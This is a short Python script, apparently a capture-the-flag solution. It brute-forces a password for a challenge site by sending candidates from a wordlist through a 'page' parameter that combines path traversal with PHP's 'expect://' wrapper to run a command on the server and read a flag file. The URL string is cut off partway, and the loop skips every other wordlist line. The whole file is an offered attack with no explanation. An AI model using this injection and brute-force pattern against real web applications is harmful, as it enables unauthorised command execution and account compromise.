import requests
import re

trypass="password"
url1='http://www.challenges.com/msjokes/index.php?page=expect://./../../../../b$
url2='+-f+flag28.txt'

passfile=open("6.1_hashes-password-list.txt", "r")

for x in passfile:
    trypass=passfile.readline()
    trypass2=re.sub('[^A-Za-z0-9!"£$%^&*%#@]+', '', trypass)
    r=requests.get(url1+trypass2+url2)
    if r.text.__contains__('Invalid password'):
        print ("not password:"+trypass)
    else:
        print ("password:"+trypass)
        break
